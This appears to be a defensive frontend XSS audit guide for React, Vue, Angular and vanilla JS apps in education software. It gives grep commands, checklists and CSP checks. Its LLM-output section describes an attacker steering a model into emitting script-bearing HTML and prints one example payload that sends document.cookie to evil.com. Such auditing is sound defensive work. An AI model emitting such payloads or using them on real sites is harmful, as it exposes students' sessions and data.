# Frontend XSS Audit

Detect Cross-Site Scripting (XSS) vulnerabilities in React, Vue, Angular, and vanilla JS frontends. Covers DOM-based XSS, reflected XSS via client-side routing, unsafe HTML rendering, and LLM output injection — tuned for EdTech apps where XSS can expose student data.

## Quick Reference

| XSS Vector | Severity | Framework | Pattern |
|---|---|---|---|
| `dangerouslySetInnerHTML` | CRITICAL | React | Raw user/LLM content rendered as HTML |
| `v-html` | CRITICAL | Vue | Same as above, Vue equivalent |
| `[innerHTML]` | CRITICAL | Angular | Bypasses Angular's built-in sanitizer |
| `document.innerHTML` | CRITICAL | Vanilla JS | Direct DOM manipulation with user input |
| `eval()` / `new Function()` | CRITICAL | All | Code execution from user-controlled strings |
| `javascript:` URLs | HIGH | All | XSS via `href`, `src`, `action` attributes |
| `postMessage` | HIGH | All | Cross-origin message handling without origin check |
| URL parameter reflection | HIGH | All | Query params rendered without escaping |
| Markdown rendering | MEDIUM | All | User markdown with embedded HTML/scripts |
| SVG injection | MEDIUM | All | SVG files with embedded `<script>` or event handlers |
| CSS injection | LOW | All | User-controlled styles enabling data exfiltration |

## Decision Tree

```
START → Identify all points where user/external content enters the DOM
  │
  ├─ Is raw HTML being rendered?
  │   ├─ dangerouslySetInnerHTML / v-html / innerHTML
  │   │   └─ Is the content sanitized? (DOMPurify, sanitize-html, etc.)
  │   │       ├─ NO → CRITICAL: Direct XSS vector
  │   │       └─ YES → Check sanitizer config (are iframes, forms, styles allowed?)
  │   │
  │   └─ Markdown renderer (react-markdown, marked, etc.)
  │       └─ Is `rehype-raw` or `html: true` enabled?
  │           └─ YES → HIGH: HTML passthrough in markdown
  │
  ├─ Is user content used in URLs?
  │   ├─ href / src / action attributes
  │   │   └─ Can user inject `javascript:` protocol?
  │   │       └─ YES → HIGH: XSS via protocol handler
  │   │
  │   └─ Dynamic navigation (window.location, router.push)
  │       └─ Is the URL validated/whitelisted?
  │           └─ NO → HIGH: Open redirect → XSS chain
  │
  ├─ Is user content used in event handlers or eval?
  │   └─ eval(), new Function(), setTimeout(string), setInterval(string)
  │       └─ YES → CRITICAL: Code execution
  │
  ├─ Does the app receive postMessage events?
  │   └─ Is event.origin verified?
  │       └─ NO → HIGH: Cross-origin XSS
  │
  └─ Does LLM output get rendered as HTML?
      └─ YES → CRITICAL: LLM-injected XSS (see Phase 4)
```

## Audit Phases

### Phase 1: Unsafe HTML Rendering

```bash
# React: dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" --include="*.tsx" --include="*.jsx" --include="*.ts" --include="*.js" src/

# Vue: v-html directive
grep -rn "v-html" --include="*.vue" --include="*.ts" --include="*.js" src/

# Angular: innerHTML binding
grep -rn "\[innerHTML\]" --include="*.html" --include="*.ts" src/

# Vanilla JS: innerHTML assignment
grep -rn "\.innerHTML\s*=" --include="*.ts" --include="*.js" src/

# jQuery: .html() with user input
grep -rn "\.html(" --include="*.ts" --include="*.js" src/

# Check for sanitization libraries
grep -rn "DOMPurify\|sanitize-html\|xss\|isomorphic-dompurify\|sanitize" --include="*.ts" --include="*.tsx" --include="*.js" src/
```

**For each unsafe HTML rendering instance, verify:**

- [ ] Is the content from a trusted source (not user input or LLM output)?
- [ ] Is the content sanitized before rendering?
- [ ] Is the sanitizer properly configured (no dangerous tags/attributes allowed)?
- [ ] Are iframes, forms, and script tags stripped?
- [ ] Are event handler attributes stripped (`onerror`, `onload`, `onclick`, etc.)?

### Phase 2: URL-Based XSS

```bash
# Find href/src with dynamic values
grep -rn "href={\|href=\"\$\|src={\|action={" --include="*.tsx" --include="*.jsx" --include="*.vue" src/

# Find window.location manipulation
grep -rn "window\.location\|location\.href\|location\.assign\|location\.replace" --include="*.ts" --include="*.tsx" --include="*.js" src/

# Find router navigation with user input
grep -rn "router\.push\|router\.replace\|navigate(" --include="*.ts" --include="*.tsx" --include="*.js" src/ | grep -v "\"/"

# Find javascript: protocol potential
grep -rn "javascript:" --include="*.ts" --include="*.tsx" --include="*.jsx" --include="*.js" --include="*.vue" src/
```

**Check for:**

- [ ] **Protocol validation**: Are `href` values checked for `javascript:`, `data:`, `vbscript:` protocols?
- [ ] **URL whitelisting**: Are redirect URLs validated against a whitelist?
- [ ] **User-controlled paths**: Can users inject path segments that break routing?

### Phase 3: Code Execution Vectors

```bash
# eval and friends
grep -rn "eval(\|new Function(\|setTimeout(\s*[\"']\|setInterval(\s*[\"']" --include="*.ts" --include="*.tsx" --include="*.js" src/

# Template literal execution
grep -rn "Function(\`\|eval(\`" --include="*.ts" --include="*.js" src/

# postMessage without origin check
grep -rn "addEventListener.*message\|onmessage" --include="*.ts" --include="*.tsx" --include="*.js" src/
```

**For each postMessage handler, verify:**

- [ ] Is `event.origin` checked against an allowed list?
- [ ] Is `event.data` validated before use?
- [ ] Is the handler registered with a specific origin filter?

### Phase 4: LLM Output XSS (EdTech-Specific)

In EdTech apps, AI-generated content is often rendered as rich HTML/Markdown:

```bash
# Find where LLM/AI output is rendered
grep -rn "dangerouslySetInnerHTML\|v-html\|\.innerHTML" --include="*.tsx" --include="*.vue" --include="*.ts" src/ | grep -i "ai\|llm\|chat\|response\|completion\|generated\|content\|answer\|explanation"

# Find markdown renderers
grep -rn "react-markdown\|ReactMarkdown\|marked\|remark\|rehype\|markdown-it" --include="*.tsx" --include="*.ts" --include="*.js" src/

# Check markdown config for raw HTML passthrough
grep -rn "rehype-raw\|html:\s*true\|sanitize:\s*false\|allowDangerousHtml" --include="*.ts" --include="*.tsx" --include="*.js" src/
```

**LLM XSS attack flow:**
1. Attacker crafts input that manipulates LLM to output HTML with scripts
2. LLM response: `Here's your quiz: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
3. Frontend renders LLM output as HTML → XSS executes

**Check for:**

- [ ] Is LLM output sanitized before rendering?
- [ ] If markdown is rendered, is raw HTML disabled?
- [ ] Are `<script>`, `<iframe>`, `<object>`, `<embed>` tags stripped?
- [ ] Are event handlers (`onerror`, `onload`, `onclick`) stripped?
- [ ] Is there a Content Security Policy blocking inline scripts?

### Phase 5: Content Security Policy

```bash
# Check for CSP headers
grep -rn "Content-Security-Policy\|contentSecurityPolicy\|helmet" --include="*.ts" --include="*.js" --include="*.py" src/ config/ middleware/

# Check meta tag CSP
grep -rn "Content-Security-Policy" --include="*.html" public/ index.html
```

**Verify CSP:**

- [ ] `script-src` does not include `'unsafe-inline'` or `'unsafe-eval'`
- [ ] `default-src` is set to `'self'`
- [ ] External scripts are whitelisted by domain or nonce/hash
- [ ] `frame-ancestors` restricts embedding (clickjacking protection)

### Phase 6: User-Generated Content Surfaces

Identify every place users can submit content that's displayed to others:

| Surface | Users | Rendered As | Sanitized |
|---|---|---|---|
| Student comments | Students → Teachers | [HTML/Text/Markdown] | [YES/NO] |
| Assignment submissions | Students → Teachers | [HTML/Text/Markdown] | [YES/NO] |
| Teacher announcements | Teachers → Students | [HTML/Text/Markdown] | [YES/NO] |
| Chat/messaging | All → All | [HTML/Text/Markdown] | [YES/NO] |
| Profile bios | All → All | [HTML/Text/Markdown] | [YES/NO] |
| File uploads (SVG) | All → All | [Rendered/Download] | [YES/NO] |

## Red Flags — Immediate Escalation

- `dangerouslySetInnerHTML` with user input and no sanitization
- LLM output rendered as HTML without DOMPurify
- Markdown renderer with `rehype-raw` or `html: true` on user content
- `eval()` or `new Function()` with any user-controlled input
- `postMessage` handler without origin verification
- `href` accepting user input without protocol validation
- No Content Security Policy in production
- SVG uploads rendered inline without sanitization
- Student-submitted content displayed to teachers without escaping

## Output

Generate a structured report with:

1. XSS vector inventory (every rendering point mapped)
2. Severity-rated findings with PoC payloads
3. Sanitization coverage map
4. CSP assessment
5. Remediation steps with code examples

## Supporting Documents

- [patterns.md](patterns.md) — XSS patterns per framework with PoC payloads
- [reporting.md](reporting.md) — Report template
